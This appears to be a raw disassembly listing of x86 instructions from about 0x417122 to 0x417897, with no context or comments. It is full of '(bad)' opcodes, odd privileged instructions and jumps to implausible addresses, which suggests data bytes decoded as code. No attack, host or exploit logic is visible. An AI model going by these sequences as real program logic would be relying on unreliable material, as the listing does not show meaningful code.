  417122:	add    BYTE PTR [edx],dl
  417124:	iret   
  417125:	clc    
  417126:	iret   
  417127:	iret   
  417128:	jb     0x417199
  41712a:	arpl   WORD PTR [ebx-0x80],si
  41712d:	jg     0x4170bb
  41712f:	inc    ecx
  417130:	mov    eax,ss
  417132:	(bad)  
  417133:	mov    dl,0xd9
  417135:	xlat   BYTE PTR ds:[ebx]
  417136:	add    BYTE PTR [eax],al
  417138:	add    BYTE PTR [eax+ebx*8],ch
  41713b:	fcomp  st(4)
  41713d:	(bad)  
  41713f:	fcomp  st(0)
  417141:	fist   WORD PTR [eax]
  417143:	cs cs pop ss
  417146:	and    al,0x24
  417148:	pop    ss
  417149:	and    al,0x24
  41714b:	adc    BYTE PTR [ebx],dl
  41714d:	jb     0x417174
  41714f:	cmp    eax,0x9660724f
  417154:	rcr    edx,1
  417156:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417157:	dec    ecx
  417158:	sub    ebp,DWORD PTR [edx+ebx*4-0x33]
  41715c:	(bad)  
  41715d:	mov    al,0xba
  41715f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417160:	sub    al,0x29
  417162:	sbb    DWORD PTR [eax],esi
  417164:	xor    dh,BYTE PTR [eax]
  417166:	add    al,0x32
  417168:	add    BYTE PTR ds:0x29303030,al
  41716e:	sub    DWORD PTR [eax],eax
  417170:	add    al,0x30
  417172:	add    BYTE PTR [edi],bl
  417174:	sub    BYTE PTR [eax],dh
  417176:	adc    ah,bl
  417178:	loope  0x41715c
  41717a:	loop   0x417168
  41717c:	clc    
  41717d:	clc    
  41717e:	clc    
  41717f:	iret   
  417180:	clc    
  417181:	clc    
  417182:	clc    
  417183:	iret   
  417184:	adc    bh,BYTE PTR [eax+0x70]
  417187:	pusha  
  417188:	gs jg  0x417114
  41718b:	jle    0x41720b
  41718d:	ins    DWORD PTR es:[edi],dx
  41718e:	shl    BYTE PTR [ebx+0xc8b66d],1
  417194:	add    BYTE PTR [eax],al
  417196:	add    al,0xd8
  417198:	add    BYTE PTR [ebx],dh
  41719a:	in     eax,dx
  41719b:	(bad)  
  41719d:	(bad)  
  41719f:	cs and al,0x17
  4171a2:	pop    ss
  4171a3:	and    al,0x24
  4171a5:	dec    ecx
  4171a6:	adc    eax,ebx
  4171a8:	scas   al,BYTE PTR es:[edi]
  4171a9:	ins    DWORD PTR es:[edi],dx
  4171aa:	je     0x417132
  4171ac:	jb     0x417201
  4171ae:	xor    DWORD PTR [eax+ebp*4-0x26],0xffffffb1
  4171b3:	inc    ebp
  4171b4:	inc    ebx
  4171b5:	gs mov cl,0xac
  4171b8:	retf   
  4171b9:	mov    eax,0x32408eb3
  4171be:	inc    edx
  4171bf:	inc    edx
  4171c0:	xor    dh,BYTE PTR [edx]
  4171c2:	xor    dh,BYTE PTR [eax]
  4171c4:	xor    BYTE PTR [edx],dh
  4171c6:	xor    BYTE PTR [eax],dh
  4171c8:	sub    DWORD PTR [eax],ebp
  4171ca:	xor    BYTE PTR [eax],dh
  4171cc:	sub    BYTE PTR [eax],al
  4171ce:	add    al,0x30
  4171d0:	add    BYTE PTR [esi],al
  4171d2:	adc    ebx,esp
  4171d4:	loope  0x4171c2
  4171d6:	in     al,dx
  4171d7:	loop   0x4171dd
  4171d9:	clc    
  4171da:	add    BYTE PTR [ecx],cl
  4171dc:	iret   
  4171dd:	clc    
  4171de:	clc    
  4171df:	clc    
  4171e0:	iret   
  4171e1:	js     0x41725d
  4171e3:	jae    0x417264
  4171e5:	add    BYTE PTR ds:0xa805007e,al
  4171eb:	scas   al,BYTE PTR es:[edi]
  4171ec:	push   edi
  4171ed:	or     ch,0x0
  4171f0:	add    BYTE PTR [eax],al
  4171f2:	add    BYTE PTR [eax],dh
  4171f4:	loope  0x4171ce
  4171f6:	(bad)  
  4171f8:	fcomp  st(0)
  4171fa:	(bad)  
  4171fc:	adc    DWORD PTR [ecx*2+0x113d2e15],esp
  417203:	fadd   st,st(5)
  417205:	enter  0xb1b3,0xa7
  417209:	lea    esp,[eax+0x6c]
  41720c:	test   BYTE PTR [esi+edi*2-0x4d],dh
  417210:	int    0x74
  417212:	cmp    dh,bh
  417214:	mov    bl,0xaf
  417216:	lods   eax,DWORD PTR ds:[esi]
  417217:	lods   eax,DWORD PTR ds:[esi]
  417218:	mov    cl,0x7d
  41721a:	inc    edx
  41721b:	inc    edx
  41721c:	xor    eax,0x32303032
  417221:	xor    eax,0x29042835
  417226:	add    BYTE PTR [eax+ebp*1],ah
  417229:	xor    BYTE PTR [eax],dh
  41722b:	sub    DWORD PTR [ecx],ebp
  41722d:	xor    BYTE PTR [edx],dh
  41722f:	sbb    ecx,esp
  417231:	(bad)  
  417233:	loop   0x41722d
  417235:	clc    
  417236:	iret   
  417237:	clc    
  417238:	iret   
  417239:	clc    
  41723a:	clc    
  41723b:	iret   
  41723c:	clc    
  41723d:	loop   0x4171fc
  41723f:	fs jge 0x4172c0
  417242:	jg     0x4172c2
  417244:	mov    DWORD PTR [ecx+0x657d7e7d],ecx
  41724a:	jge    0x4171e2
  41724c:	add    BYTE PTR [eax],al
  41724e:	add    BYTE PTR [ebx],al
  417250:	fcomp  st(0)
  417252:	fadd   DWORD PTR [eax]
  417254:	add    al,0xdf
  417256:	add    BYTE PTR ds:0x242407c5,ch
  41725c:	adc    ecx,DWORD PTR [edi]
  41725e:	fcomp  st(6)
  417260:	jmp    0xc82a3a2c
  417265:	fld    st(0)
  417267:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417268:	int    0xa8
  41726a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41726b:	adc    DWORD PTR [edx-0x5101494d],0xa1adb5b5
  417275:	mov    DWORD PTR [eax],edi
  417277:	sub    bl,BYTE PTR [eax]
  417279:	xor    eax,0x6460442c
  41727e:	gs gs pusha 
  417281:	inc    eax
  417282:	sbb    DWORD PTR [ecx],ebp
  417284:	push   ss
  417285:	add    BYTE PTR [esi],al
  417287:	sub    DWORD PTR [eax],eax
  417289:	or     BYTE PTR [eax],ch
  41728b:	xor    BYTE PTR [ecx],dl
  41728d:	fucom  st(2)
  41728f:	clc    
  417290:	clc    
  417291:	iret   
  417292:	add    al,0xf8
  417294:	add    BYTE PTR [ecx],cl
  417296:	iret   
  417297:	adc    al,bh
  417299:	loope  0x41725b
  41729b:	jae    0x41731b
  41729d:	jg     0x417228
  41729f:	add    BYTE PTR [esi+edi*2],al
  4172a2:	add    BYTE PTR ds:0x64657d7d,al
  4172a8:	jge    0x4172aa
  4172aa:	add    BYTE PTR [eax],al
  4172ac:	add    BYTE PTR [edx-0x28],al
  4172af:	fcomip st,st(5)
  4172b1:	(bad)  
  4172b3:	(bad)  
  4172b5:	lds    eax,FWORD PTR [edi]
  4172b7:	dec    ecx
  4172b8:	adc    esi,ebx
  4172ba:	(bad)
  4172bd:	leave  
  4172be:	mov    edi,0xe8dbd7d7
  4172c3:	fucomi st,st(3)
  4172c5:	aad    0xbe
  4172c7:	int    0xb1
  4172c9:	test   eax,0xb30192fd
  4172ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4172cf:	lods   eax,DWORD PTR ds:[esi]
  4172d0:	mov    ecx,0x405080b1
  4172d5:	ins    BYTE PTR es:[edi],dx
  4172d6:	jg     0x4172d4
  4172d8:	std    
  4172d9:	add    ebp,edi
  4172db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4172dc:	mov    cl,0xb2
  4172de:	mov    ch,0xc1
  4172e0:	and    BYTE PTR [edx],ch
  4172e2:	sub    DWORD PTR [edx],ebp
  4172e4:	sub    ch,BYTE PTR [ecx]
  4172e6:	dec    esp
  4172e7:	sub    DWORD PTR [ecx],ebp
  4172e9:	xor    BYTE PTR [ebx],dl
  4172eb:	in     al,dx
  4172ec:	clc    
  4172ed:	clc    
  4172ee:	clc    
  4172ef:	iret   
  4172f0:	push   es
  4172f1:	clc    
  4172f2:	add    BYTE PTR [eax],cl
  4172f4:	loop   0x4172ce
  4172f6:	retf   0x7fb4
  4172f9:	mov    DWORD PTR [edi+0x7e],edi
  4172fc:	add    eax,0x6403007d
  417301:	jge    0x417368
  417303:	add    BYTE PTR [eax],al
  417305:	add    BYTE PTR [ecx],al
  417307:	fadd   DWORD PTR [ecx]
  417309:	cmc    
  41730a:	add    al,0xdf
  41730c:	add    BYTE PTR [eax],dh
  41730e:	(bad)  
  417310:	in     eax,dx
  417311:	fadd   DWORD PTR [esi]
  417313:	retf   0xf7df
  417316:	mov    edi,0xdbd7dab9
  41731b:	mov    bh,0xd7
  41731d:	mov    bh,0xb7
  41731f:	mov    edi,0xb2b2b5b9
  417324:	xchg   esp,eax
  417325:	mov    cl,0xa7
  417327:	mov    ch,0xc9
  417329:	retf   
  41732a:	mov    edx,0x9a898ca7
  41732f:	std    
  417330:	cmp    esi,0xafb5bbae
  417336:	retf   
  417337:	mov    dl,0xb3
  417339:	adc    esi,DWORD PTR [ebx]
  41733b:	and    BYTE PTR [ecx],ch
  41733d:	sub    al,BYTE PTR [esi]
  41733f:	sub    DWORD PTR [eax],eax
  417341:	add    eax,0xf8f8ec1a
  417346:	iret   
  417347:	add    BYTE PTR ds:0xcf1200f8,al
  41734d:	loop   0x417327
  41734f:	(bad)  
  417351:	mov    ebx,0x7f7e7f7e
  417356:	jg     0x4173d7
  417358:	jge    0x4173bf
  41735a:	jge    0x4173d9
  41735c:	gs jge 0x41735f
  41735f:	add    BYTE PTR [ecx],al
  417361:	fadd   DWORD PTR [edi+ebx*8]
  417364:	add    BYTE PTR [ebx-0x22],dl
  417367:	(bad)  
  417369:	(bad)
  41736c:	out    0xca,al
  41736e:	(bad)  
  41736f:	leave  
  417370:	mov    ch,0xae
  417372:	mov    cl,0xb3
  417374:	int    0xb9
  417376:	retf   
  417377:	lods   eax,DWORD PTR ds:[esi]
  417378:	mov    ch,0xb2
  41737a:	mov    dl,0xad
  41737c:	lods   eax,DWORD PTR ds:[esi]
  41737d:	retf   
  41737e:	mov    ecx,0xbfbfbfba
  417383:	mov    ch,0x8e
  417385:	ins    DWORD PTR es:[edi],dx
  417386:	mov    WORD PTR [edi-0x2825444c],fs
  41738c:	fnop   
  41738e:	mov    esp,0x3d4460ab
  417393:	push   esi
  417394:	cmp    ebp,DWORD PTR [edx]
  417396:	sub    ch,BYTE PTR [ecx]
  417398:	sub    DWORD PTR [edx],ebp
  41739a:	sub    DWORD PTR [ecx],ebp
  41739c:	sub    DWORD PTR [ecx],ebx
  41739e:	clc    
  41739f:	in     al,dx
  4173a0:	iret   
  4173a1:	clc    
  4173a2:	iret   
  4173a3:	clc    
  4173a4:	loop   0x41739e
  4173a6:	clc    
  4173a7:	in     al,dx
  4173a8:	in     al,dx
  4173a9:	fadd   DWORD PTR [esi]
  4173ab:	jmp    0x7ebff48a
  4173b0:	jle    0x41742f
  4173b2:	jge    0x417433
  4173b4:	jg     0x417433
  4173b6:	gs jge 0x417436
  4173b9:	add    BYTE PTR [eax],al
  4173bb:	add    BYTE PTR [eax],al
  4173bd:	push   es
  4173be:	fcomp  st(7)
  4173c0:	(bad)  
  4173c2:	(bad)  
  4173c4:	push   es
  4173c5:	fiadd  WORD PTR [eax]
  4173c7:	adc    edi,eax
  4173c9:	(bad)  
  4173ca:	mov    eax,0x8e6d65d0
  4173cf:	xchg   edx,eax
  4173d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4173d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4173d2:	scas   al,BYTE PTR es:[edi]
  4173d3:	mov    cl,0xb2
  4173d5:	mov    edi,0xc7d5d6
  4173da:	add    al,0xd7
  4173dc:	add    BYTE PTR [eax],ah
  4173de:	fcmovne st,st(5)
  4173e0:	jae    0x417455
  4173e2:	je     0x417374
  4173e4:	stos   BYTE PTR es:[edi],al
  4173e5:	enter  0xbcd1,0xa4
  4173e9:	test   BYTE PTR [edx+0x551e717c],cl
  4173ef:	cs das 
  4173f1:	and    ebp,DWORD PTR [edx]
  4173f3:	sub    DWORD PTR [edx],ebp
  4173f5:	sub    DWORD PTR [ecx],ebp
  4173f7:	dec    esp
  4173f8:	sub    DWORD PTR [edx],ebp
  4173fa:	in     al,dx
  4173fb:	clc    
  4173fc:	clc    
  4173fd:	iret   
  4173fe:	add    eax,0xec0a00f8
  417403:	loope  0x4173e3
  417405:	faddp  st(5),st
  417407:	fnstenv [esi+edi*2+0x7f047d7f]
  41740e:	add    BYTE PTR [edi*2+0x657d7f],al
  417415:	add    BYTE PTR [edi+ebx*8],al
  417418:	add    BYTE PTR [esi+ebx*8-0x22],dl
  41741c:	jmp    0xe72039ff
  417421:	enter  0xb9c7,0xda
  417425:	adc    DWORD PTR [ebx+0x26],eax
  417428:	addr16 pop edi
  41742a:	fs pusha 
  41742c:	cmp    BYTE PTR [ebp-0x58],0xd0
  417430:	retf   0xdec5
  417433:	fsubp  st(1),st
  417435:	jmp    0xc10c3f23
  41743a:	cli    
  41743b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41743c:	ins    BYTE PTR es:[edi],dx
  41743d:	ins    BYTE PTR es:[edi],dx
  41743e:	test   al,0x85
  417440:	jb     0x4174b3
  417442:	dec    edi
  417443:	push   ds
  417444:	ja     0x417464
  417446:	dec    edi
  417447:	push   ebp
  417448:	push   esi
  417449:	cmp    esi,DWORD PTR cs:0x2a292942
  417450:	sub    DWORD PTR [ecx],ebp
  417452:	sub    dl,BYTE PTR [eax]
  417454:	clc    
  417455:	iret   
  417456:	clc    
  417457:	clc    
  417458:	in     al,dx
  417459:	clc    
  41745a:	clc    
  41745b:	clc    
  41745c:	loop   0x417408
  41745e:	fsubp  st(1),st
  417460:	(bad)
  417463:	jge    0x4174e4
  417465:	jg     0x4174e6
  417467:	jle    0x4174e8
  417469:	cmp    BYTE PTR [edi+0x7f],0x7d
  41746d:	jge    0x41746f
  41746f:	add    BYTE PTR [edi+ebx*8],al
  417472:	add    BYTE PTR ds:0xc5dedede,bh
  417478:	(bad)  
  41747a:	(bad)  [edi+0x1ac1b805]
  417480:	xor    esi,DWORD PTR [eax]
  417482:	xor    BYTE PTR [eax+0x50],bl
  417485:	mov    ecx,DWORD PTR [eax-0x5b573d70]
  41748b:	rcr    ecx,1
  41748d:	enter  0xe9c5,0xe9
  417491:	jmp    0xcb205360
  417496:	rol    dl,0xa8
  417499:	jp     0x41741f
  41749b:	es jno 0x4174ed
  41749e:	cmp    al,0x4f
  4174a0:	dec    edi
  4174a1:	cmp    eax,0x40432e4d
  4174a6:	ins    BYTE PTR es:[edi],dx
  4174a7:	xor    eax,0x29295130
  4174ac:	sub    dl,BYTE PTR [ebx]
  4174ae:	iret   
  4174af:	clc    
  4174b0:	iret   
  4174b1:	add    BYTE PTR [eax+edi*8],al
  4174b4:	add    BYTE PTR [ebx],dl
  4174b6:	in     al,dx
  4174b7:	out    dx,al
  4174b8:	vpsubsw xmm0,xmm2,xmm5
  4174bc:	sar    DWORD PTR [ebx+0x7d807f7e],cl
  4174c2:	jge    0x417543
  4174c4:	jg     0x417446
  4174c6:	jg     0x417545
  4174c8:	add    BYTE PTR gs:[eax],al
  4174cb:	add    BYTE PTR [eax],al
  4174cd:	pop    eax
  4174ce:	(bad)  
  4174d0:	cmc    
  4174d1:	(bad)  
  4174d3:	(bad)
  4174d6:	(bad)
  4174d9:	idiv   BYTE PTR [ecx+0x5e4226b9]
  4174df:	cmp    BYTE PTR [esi-0x253f3e3f],al
  4174e5:	fisub  DWORD PTR [ebx-0x57696944]
  4174eb:	rcr    bl,0xc8
  4174ee:	(bad)
  4174f1:	fmulp  st(2),st
  4174f3:	fsubp  st(1),st
  4174f5:	(bad)
  4174f8:	shr    BYTE PTR [eax+0x37885f74],1
  4174fe:	dec    ebp
  4174ff:	dec    ebp
  417500:	push   esi
  417501:	sbb    dl,BYTE PTR cs:[edi-0x7f]
  417505:	dec    edx
  417506:	sub    DWORD PTR [ecx],ebp
  417508:	xor    BYTE PTR [eax],dh
  41750a:	xor    BYTE PTR [ebx],dh
  41750c:	clc    
  41750d:	clc    
  41750e:	iret   
  41750f:	in     al,dx
  417510:	in     al,dx
  417511:	clc    
  417512:	clc    
  417513:	fcomp  st(6)
  417515:	jmp    0xc6075ee2
  41751a:	fisubr DWORD PTR [ebx+0x7f8d657d]
  417520:	jge    0x4175a1
  417522:	jge    0x4175a1
  417524:	jge    0x4175a3
  417526:	add    BYTE PTR [eax],al
  417528:	add    al,0xdf
  41752a:	add    BYTE PTR [esi+ebx*8],ch
  41752d:	retf   0xdedf
  417530:	jmp    0xb9fa40ec
  417535:	rol    DWORD PTR [edx+edi*2-0x6],1
  417539:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41753a:	enter  0xd0da,0xbc
  41753e:	mov    dh,0x96
  417540:	je     0x4174d8
  417542:	test   al,0x96
  417544:	mov    ebx,0xcae9e9ca
  417549:	rol    ecx,1
  41754b:	retf   0xc8c5
  41754e:	call   0xdc2b4d3b
  417553:	mov    bh,0xda
  417555:	mov    dh,0x8d
  417557:	es add al,0x2e
  41755a:	add    BYTE PTR [eax+ebx*2],cl
  41755d:	pusha  
  41755e:	add    DWORD PTR [eax+esi*1+0x30],eax
  417562:	xor    BYTE PTR [ecx],ch
  417564:	sub    DWORD PTR [edx],ebp
  417566:	iret   
  417567:	iret   
  417568:	add    al,0xf8
  41756a:	add    BYTE PTR [ecx+eiz*8],dl
  41756d:	fucomip st,st(0)
  41756f:	enter  0xc8c5,0xc5
  417573:	jmp    0x7fbf3156
  417578:	jge    0x4175f7
  41757a:	push   edi
  41757b:	gs jae 0x4175de
  41757e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41757f:	rol    DWORD PTR [eax],1
  417581:	add    BYTE PTR [eax],al
  417583:	cmp    edi,ebx
  417585:	(bad)  
  417587:	(bad)  
  417589:	(bad)  
  41758b:	enter  0xbfeb,0xbf
  41758f:	retf   
  417590:	mov    edx,0xc80bbbb4
  417595:	sar    DWORD PTR [esi+edx*4+0x64747380],1
  41759c:	test   BYTE PTR [ebx-0x3a3e9f75],cl
  4175a2:	jmp    0x74d83690
  4175a7:	xchg   esi,eax
  4175a8:	mov    ebx,0xe8d7d7cb
  4175ad:	jmp    0x417576
  4175af:	mov    bh,0xb7
  4175b1:	(bad)  
  4175b2:	shl    BYTE PTR [edi],0x2f
  4175b5:	dec    ecx
  4175b6:	das    
  4175b7:	push   esi
  4175b8:	cmp    BYTE PTR cs:[ebp+0x38],ah
  4175bc:	sub    DWORD PTR [eax],eax
  4175be:	add    al,0x30
  4175c0:	add    BYTE PTR [ebx],bl
  4175c2:	sub    DWORD PTR [eax],edx
  4175c4:	add    al,0xf8
  4175c6:	loop   0x4175c0
  4175c8:	in     al,dx
  4175c9:	loope  0x4175a9
  4175cb:	fcmovnb st,st(5)
  4175cd:	call   0xdf075fbb
  4175d2:	sar    DWORD PTR [ebp+0x5a],1
  4175d5:	jge    0x41763b
  4175d7:	arpl   WORD PTR [ebp-0x3af4107c],ax
  4175dd:	add    BYTE PTR [eax],al
  4175df:	add    BYTE PTR [eax],al
  4175e1:	xor    edi,ebx
  4175e3:	(bad)  
  4175e5:	(bad)  
  4175e7:	fmulp  st(0),st
  4175e9:	aad    0xbf
  4175eb:	leave  
  4175ec:	leave  
  4175ed:	mov    ecx,0xd0c0c0ba
  4175f2:	xchg   esi,eax
  4175f3:	jle    0x417662
  4175f5:	jle    0x41765b
  4175f7:	inc    ebp
  4175f8:	cmp    BYTE PTR [edi],bh
  4175fa:	jno    0x41761a
  4175fc:	cmp    BYTE PTR [esi-0x28171738],dl
  417602:	mov    ebx,0x8cabb67e
  417607:	mov    DWORD PTR [ecx-0x3b415330],esi
  41760d:	mov    bh,0xd6
  417610:	retf   0x253b
  417613:	add    BYTE PTR [edi+ebp*1],al
  417616:	add    BYTE PTR [ebx],ah
  417618:	pop    eax
  417619:	push   eax
  41761a:	xor    eax,0x3032302a
  41761f:	xor    BYTE PTR [eax],dh
  417621:	adc    al,0xcf
  417623:	in     al,dx
  417624:	adc    bh,cl
  417626:	loop   0x417607
  417628:	(bad)
  41762b:	vpsubsw xmm0,xmm2,xmm5
  41762f:	jmp    0x88ade2fe
  417634:	or     DWORD PTR [edx+0x6dfefbd],0xffffffc8
  41763b:	add    BYTE PTR [eax],al
  41763d:	add    BYTE PTR [edi+ebx*8],al
  417640:	add    BYTE PTR ds:0xc6d7e9c5,dh
  417646:	loopne 0x417601
  417648:	mov    ecx,0xc0bfdab9
  41764d:	ret    0xa8bc
  417650:	test   al,0xbd
  417652:	aaa    
  417653:	cmp    eax,0x2b3d493d
  417658:	pusha  
  417659:	mov    cl,0xb7
  41765b:	mov    ah,0xb9
  41765e:	scas   al,BYTE PTR es:[edi]
  41765f:	xor    DWORD PTR [ebx-0x7e7e4e51],0xbab3a792
  417669:	mov    dh,0xbf
  41766c:	push   cs
  41766d:	xor    al,0x2f
  41766f:	cmp    esp,DWORD PTR ds:0x2f2f252f
  417675:	cmp    esi,DWORD PTR [ebx]
  417677:	add    BYTE PTR [eax+esi*1],al
  41767a:	add    BYTE PTR [ebx],bl
  41767c:	xor    dl,BYTE PTR [ebx]
  41767e:	clc    
  41767f:	clc    
  417680:	clc    
  417681:	in     al,dx
  417682:	pop    es
  417683:	ffreep st(5)
  417685:	jmp    0xdf07524f
  41768a:	in     eax,dx
  41768b:	adc    DWORD PTR [ebx],edx
  41768d:	xor    eax,0x8a8a8338
  417692:	or     al,bl
  417694:	(bad)  
  417696:	enter  0x0,0x0
  41769a:	add    BYTE PTR [ebx],dh
  41769c:	(bad)  
  41769e:	(bad)  
  4176a0:	jmp    0xba0d3d6c
  4176a5:	mov    ecx,0xc7c9bab9
  4176aa:	cmc    
  4176ab:	cmc    
  4176ac:	(bad)  
  4176ae:	(bad)  
  4176b0:	stos   BYTE PTR es:[edi],al
  4176b1:	adc    DWORD PTR [edi],esi
  4176b3:	and    eax,0xb68d7c3d
  4176b8:	mov    bh,0xc6
  4176ba:	(bad)  
  4176bb:	mov    ebx,0xb5ab7a8e
  4176c0:	mov    edx,0x7f73fd9a
  4176c5:	std    
  4176c6:	call   0x4e3b:0x11acb2b1
  4176cd:	cmp    edi,DWORD PTR [ebx]
  4176cf:	add    BYTE PTR ds:0x3b20002f,al
  4176d5:	sub    dh,BYTE PTR [edx]
  4176d7:	xor    BYTE PTR [edx],dh
  4176d9:	push   ecx
  4176da:	sbb    al,BYTE PTR [eax+edi*8]
  4176dd:	clc    
  4176de:	in     al,dx
  4176df:	fadd   st,st(5)
  4176e1:	in     eax,0xe9
  4176e3:	(bad)
  4176e6:	sbb    DWORD PTR es:[eax],esi
  4176e9:	sub    BYTE PTR [eax],bh
  4176eb:	xchg   BYTE PTR [ebx-0x121e107d],al
  4176f1:	retf   0xc5c8
  4176f4:	add    BYTE PTR [eax],al
  4176f6:	add    BYTE PTR [eax],dh
  4176f8:	(bad)
  4176fb:	enter  0xc6d7,0xc6
  4176ff:	leave  
  417700:	mov    ecx,0xd7b8b9b9
  417705:	(bad)  
  417707:	ffreep st(5)
  417709:	ffreep st(5)
  41770b:	jmp    0x90d4106
  417710:	adc    bh,BYTE PTR [ebp-0x34343274]
  417716:	(bad)  
  417717:	mov    cl,0x39
  417719:	sbb    al,BYTE PTR [eax-0x59]
  41771c:	int    0xb3
  41771e:	add    DWORD PTR [ebx+0x26],esi
  417721:	inc    ebp
  417722:	stos   DWORD PTR es:[edi],eax
  417723:	xchg   DWORD PTR [edx+0x4341ab4],edx
  417729:	cmp    eax,DWORD PTR [edi+ebp*1]
  41772c:	add    BYTE PTR [eax],ah
  41772e:	cmp    ebp,DWORD PTR [edx]
  417730:	xor    BYTE PTR [edx],dh
  417732:	xor    BYTE PTR [edx],dh
  417734:	sbb    DWORD PTR [eax],edx
  417736:	in     al,dx
  417737:	clc    
  417738:	pop    es
  417739:	(bad)  
  41773b:	lds    eax,FWORD PTR [esi]
  41773d:	out    dx,eax
  41773e:	sbb    DWORD PTR [eax],esi
  417740:	push   ecx
  417741:	xor    ch,BYTE PTR [eax]
  417743:	xor    eax,0xef838a83
  417748:	loope  0x417716
  41774a:	in     eax,dx
  41774b:	retf   0xd7c8
  41774e:	add    BYTE PTR [eax],al
  417750:	add    BYTE PTR [esi],al
  417752:	jmp    0xc7094d32
  417757:	mov    edi,0x2a00b904
  41775c:	retf   
  41775d:	or     bl,bh
  41775f:	fcomp  st(7)
  417761:	(bad)  
  417763:	faddp  st(5),st
  417765:	xlat   BYTE PTR ds:[ebx]
  417766:	loopne 0x417731
  417768:	mov    ecx,0xd0d0d9b8
  41776d:	lods   al,BYTE PTR ds:[esi]
  41776e:	mov    dh,0xaf
  417771:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417772:	ins    BYTE PTR es:[edi],dx
  417773:	xor    al,0x34
  417775:	inc    ebp
  417776:	scas   al,BYTE PTR es:[edi]
  417777:	mov    ecx,0x5060fdb6
  41777c:	xor    edi,DWORD PTR [eax]
  41777e:	inc    eax
  41777f:	cmp    BYTE PTR [eax+ebx*1],dh
  417782:	xor    al,0x34
  417784:	cmp    edi,DWORD PTR [ebx]
  417786:	add    al,0x2f
  417788:	add    BYTE PTR [eax],ah
  41778a:	cmp    esp,DWORD PTR [ebx]
  41778c:	sub    DWORD PTR [edx],esi
  41778e:	xor    dh,BYTE PTR [edx]
  417790:	xor    BYTE PTR [ebx],dl
  417792:	add    al,0xec
  417794:	fcomp  st(6)
  417796:	or     BYTE PTR [esi],ah
  417798:	sbb    DWORD PTR [edx],esi
  41779a:	daa    
  41779b:	xor    dl,BYTE PTR [ecx+0x30]
  41779e:	xor    BYTE PTR [esi-0x7a],dh
  4177a1:	mov    bh,BYTE PTR [ebp-0x20122732]
  4177a7:	enter  0xc8c8,0x0
  4177ab:	add    BYTE PTR [eax],al
  4177ad:	pop    eax
  4177ae:	fcmovnbe st,st(7)
  4177b0:	mov    esi,0xb9b9b5ad
  4177b6:	leave  
  4177b7:	(bad)  
  4177b8:	xlat   BYTE PTR ds:[ebx]
  4177b9:	(bad)  
  4177bb:	fcomp  st(6)
  4177bd:	(bad)  
  4177bf:	vshufpd xmm7,xmm2,XMMWORD PTR [edi-0x361f3637],0xc9
  4177c8:	aad    0xc8
  4177ca:	xlat   BYTE PTR ds:[ebx]
  4177cb:	mov    bh,0xcd
  4177cd:	(bad)  
  4177ce:	cmp    esp,DWORD PTR es:0xcbae443b
  4177d5:	mov    cl,0x1
  4177d7:	ins    BYTE PTR es:[edi],dx
  4177d8:	inc    ebx
  4177d9:	xor    al,0x34
  4177db:	xor    al,0x33
  4177dd:	xor    al,0x4e
  4177df:	and    ebx,DWORD PTR [ebx+0x3b]
  4177e2:	cmp    edi,DWORD PTR [ebx]
  4177e4:	das    
  4177e5:	pop    ebp
  4177e6:	das    
  4177e7:	cmp    ebp,DWORD PTR [edx]
  4177e9:	xor    dh,BYTE PTR [edx]
  4177eb:	xor    BYTE PTR [edx],dh
  4177ed:	sbb    bh,al
  4177ef:	fmul   DWORD PTR [edi]
  4177f1:	xor    dl,BYTE PTR es:[ecx+0x32]
  4177f5:	xor    dh,BYTE PTR [edx]
  4177f7:	xor    BYTE PTR [edx],dh
  4177f9:	sub    BYTE PTR [ebx+eax*4-0x7d],bl
  4177fd:	mov    bl,BYTE PTR [ecx-0x371227f9]
  417803:	enter  0xd7c8,0x0
  417807:	add    BYTE PTR [eax],al
  417809:	push   cs
  41780a:	xlat   BYTE PTR ds:[ebx]
  41780b:	mov    esi,0xad9b9bad
  417811:	mov    ecx,0xd8dec7c6
  417816:	fcomp  st(7)
  417818:	add    al,0xde
  41781a:	add    BYTE PTR [esi],dh
  41781c:	xlat   BYTE PTR ds:[ebx]
  41781d:	loopne 0x4177e8
  41781f:	leave  
  417820:	scas   eax,DWORD PTR es:[edi]
  417821:	leave  
  417822:	leave  
  417823:	leave  
  417824:	(bad)  
  417825:	jmp    0xbc1c6213
  41782a:	adc    bl,BYTE PTR [eax]
  41782c:	pop    ebp
  41782d:	and    eax,0xb5b36419
  417832:	call   0x2a33:0x33343881
  417839:	xor    esp,DWORD PTR [ebx]
  41783b:	xor    esp,DWORD PTR [ebx]
  41783d:	xor    al,0x3b
  41783f:	cmp    ebx,DWORD PTR [ebp+0x2f]
  417842:	cmp    edi,DWORD PTR [ebx]
  417844:	xor    ebp,DWORD PTR [eax]
  417846:	xor    dh,BYTE PTR [eax]
  417848:	xor    bl,BYTE PTR [ecx]
  41784a:	adc    DWORD PTR [ebx],edx
  41784c:	sbb    DWORD PTR [edx],esi
  41784e:	xor    dh,BYTE PTR [eax]
  417850:	xor    dh,BYTE PTR [eax]
  417852:	add    al,0x32
  417854:	add    BYTE PTR [esi+ebx*2],cl
  417857:	add    DWORD PTR [ebx-0x5527ee43],0x8
  41785e:	adc    edi,ebp
  417860:	retf   0xd7
  417863:	add    BYTE PTR [eax],al
  417865:	or     eax,0xcbc6c6d7
  41786a:	fwait
  41786b:	fwait
  41786c:	lods   al,BYTE PTR ds:[esi]
  41786d:	loopne 0x417836
  41786f:	out    0xdf,al
  417871:	fcomp  st(7)
  417873:	add    BYTE PTR [esi+ebx*8],al
  417876:	add    BYTE PTR [ebx],ch
  417878:	jmp    0xca0b4244
  41787d:	retf   
  41787e:	leave  
  41787f:	mov    edi,0xd7c4c6c9
  417884:	fcmovnu st,st(3)
  417886:	call   0x374a4362
  41788b:	and    eax,0xb2d0a726
  417890:	xchg   edx,eax
  417891:	jle    0x4178e3
  417893:	xor    al,0x33
  417895:	xor    ebp,DWORD PTR [edx]
  417897:	sub    dh,BYTE PTR [ebx]
